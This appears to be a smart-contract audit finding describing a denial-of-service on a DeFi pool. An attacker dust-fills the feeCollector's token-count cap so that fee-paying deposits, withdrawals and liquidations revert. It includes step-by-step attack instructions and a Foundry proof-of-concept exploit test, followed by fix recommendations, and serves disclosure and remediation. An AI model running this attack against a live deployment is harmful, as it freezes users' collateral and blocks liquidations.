### Title
Attacker can DoS deposits, withdrawals and liquidations by dust-filling the `feeCollector`'s `MAX_TOKENS_PER_USER` account set - (File: contracts/Pool.sol)

### Summary
`Pool` tracks each account's held deposit/debt tokens in `depositTokensOfAccount`/`debtTokensOfAccount` and hard-reverts with `UserReachedMaxTokens` once the combined count reaches `MAX_TOKENS_PER_USER = 30` (`Pool.sol:79,143-148`). `DepositToken._transfer` and `_mint` unconditionally call `pool.addToDepositTokensOfAccount(recipient_)` the first time any recipient touches a given deposit token (`DepositToken.sol:486-488,517-520`). The protocol `feeCollector` is a fee recipient inside `_transfer`/`_mint` paths, so an unprivileged attacker can permissionlessly dust-transfer one wei of every listed deposit token to `feeCollector`, filling its account set to the cap. From then on, every fee-bearing deposit, withdrawal, and liquidation reverts, freezing user collateral and bricking liquidations.

### Finding Description
The relevant flows that push tokens to `feeCollector`:

- `DepositToken.deposit` mints the deposit fee to `feeCollector` via `_mint(_pool.feeCollector(), _fee)` → `addToDepositTokensOfAccount` (`DepositToken.sol:229-232,486-488`).
- `DepositToken._withdraw` transfers the withdraw fee via `_transfer(account_, _pool.feeCollector(), _fee)` (`DepositToken.sol:545-548`).
- `Pool.liquidate` seizes the protocol fee via `depositToken_.seize(account_, _poolRegistry.feeCollector(), _fee)` → `_transfer` → `addToDepositTokensOfAccount` (`Pool.sol:591-593`).

`addToDepositTokensOfAccount` is guarded by `onlyIfAdditionWillNotReachMaxTokens` (`Pool.sol:143-148`), which reverts when `debtTokensOfAccount.length + depositTokensOfAccount.length >= 30`.

Attack steps (all public entry points, no privileges):

1. For each deposit token listed in the pool (`Pool.getDepositTokens()`, up to 30 allowed per `addDepositToken`, `Pool.sol:703`), the attacker deposits a dust amount of the underlying and receives dust `msdTOKEN`, or acquires it on the market.
2. The attacker calls `depositToken.transfer(feeCollector, dust)` for each deposit token the `feeCollector` does not yet hold. Each call adds that token to `depositTokensOfAccount[feeCollector]` (`DepositToken.sol:348-354,517-520`). `transfer` only checks the sender's unlocked balance — there is no opt-in for the recipient.
3. Once `feeCollector` hits 30 entries, every subsequent `_mint`/`_transfer` targeting `feeCollector` reverts with `UserReachedMaxTokens`.

The H-01 analog maps cleanly: in the Cosmos case a malicious hook makes reward-token transfers fail inside `BeforeDelegationSharesModified`, freezing withdrawals and halting slashing; here an attacker-controlled state (the victim-set size of `feeCollector`) makes fee transfers fail inside deposit/withdraw/liquidate, freezing collateral exits and blocking the liquidations needed to keep the pool solvent.

### Impact Explanation
- Any `deposit`/`withdraw` on any deposit token reverts whenever `depositFee`/`withdrawFee` > 0, because the fee leg to `feeCollector` fails — users' underlying collateral is locked in `Treasury` (`_withdraw` → `treasury.pull`, `DepositToken.sol:551`).
- `Pool.liquidate` reverts whenever `protocolFee` > 0, so unhealthy positions cannot be liquidated, risking protocol insolvency as collateral prices move.
- The DoS persists until `feeCollector` itself empties a dust balance (burns/withdraws/transfers each token fully) to drop below the cap — i.e., a temporary freezing of funds and liquidation-liveness failure caused entirely by an unprivileged attacker. If `feeCollector` is a contract without a generic withdrawal path for these tokens, the freeze can be permanent.

### Likelihood Explanation
- Requires the pool to list enough deposit tokens to reach the cap (max 30 per `addDepositToken`, `Pool.sol:703`) or the `feeCollector` already holding positions. On a fully populated pool the attack is a handful of dust transfers — cheap and purely unprivileged.
- Requires nonzero deposit/withdraw/liquidation protocol fees (configured in `FeeProvider`), which is the normal deployed configuration.
- No modifier stops it: `transfer` is permissionless, `onlyIfAdditionWillNotReachMaxTokens` is exactly the mechanism being weaponized, and there is no exemption or bounded-fee path for `feeCollector`.

### Recommendation
- Exclude `feeCollector` (and other protocol addresses) from `MAX_TOKENS_PER_USER` accounting, or keep fee balances in a separate accounting structure instead of `depositTokensOfAccount`.
- Alternatively, do not add the recipient to the account set for fee/zero-dust transfers below a threshold, or allow removal-on-zero as the only path while letting fee transfers bypass the cap.
- A defense-in-depth option: make `transfer`/`transferFrom` not auto-register the recipient (only `deposit`/`seize` into positions should track tokens), eliminating forced registration entirely.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Pool} from "../contracts/Pool.sol";
import {DepositToken} from "../contracts/DepositToken.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

// Fork test against a deployed pool with nonzero deposit/withdraw/liquidation fees.
contract FeeCollectorGriefingTest is Test {
    Pool pool;          // deployed Pool proxy
    address attacker = makeAddr("attacker");

    function test_dustFeeCollectorToCap_dosFees() public {
        address feeCollector = address(pool.poolRegistry().feeCollector());
        address[] memory dts = pool.getDepositTokens(); // assume pool lists MAX_TOKENS_PER_USER deposit tokens

        vm.startPrank(attacker);
        for (uint256 i; i < dts.length; ++i) {
            DepositToken dt = DepositToken(dts[i]);
            // skip tokens feeCollector already holds (already counted in its set)
            if (dt.balanceOf(feeCollector) == 0 && dt.balanceOf(attacker) == 0) {
                IERC20 underlying = dt.underlying();
                deal(address(underlying), attacker, 1e6);
                underlying.approve(address(dt), 1e6);
                dt.deposit(1e6, attacker);          // mint dust msdTOKEN
            }
            if (dt.balanceOf(attacker) > 0 && dt.balanceOf(feeCollector) == 0) {
                dt.transfer(feeCollector, 1);       // registers token in feeCollector's set
            }
        }
        vm.stopPrank();

        // Sanity: feeCollector set is now at cap (30)
        assertEq(pool.getDepositTokensOfAccount(feeCollector).length, pool.MAX_TOKENS_PER_USER());

        // 1) Any deposit paying a fee reverts: _mint(feeCollector, fee) -> addToDepositTokensOfAccount -> UserReachedMaxTokens
        DepositToken dt0 = DepositToken(dts[0]);
        IERC20 underlying0 = dt0.underlying();
        address bob = makeAddr("bob");
        deal(address(underlying0), bob, 100e18);
        vm.startPrank(bob);
        underlying0.approve(address(dt0), 100e18);
        vm.expectRevert(Pool.UserReachedMaxTokens.selector);
        dt0.deposit(100e18, bob);
        vm.stopPrank();

        // 2) Any withdraw paying a fee reverts: _transfer(account, feeCollector, fee) -> UserReachedMaxTokens
        //    (requires an account with an existing unlocked balance)
        // 3) Pool.liquidate reverts when protocolFee > 0:
        //    depositToken_.seize(account_, feeCollector, _fee) -> _transfer -> UserReachedMaxTokens (Pool.sol:591-593)
    }
}
```

Key state/calls: `Pool.sol:79` (`MAX_TOKENS_PER_USER`), `Pool.sol:143-148` (revert), `DepositToken.sol:517-520` and `486-488` (auto-registration of recipient), `Pool.sol:591-593` (liquidation fee seize to `feeCollector`).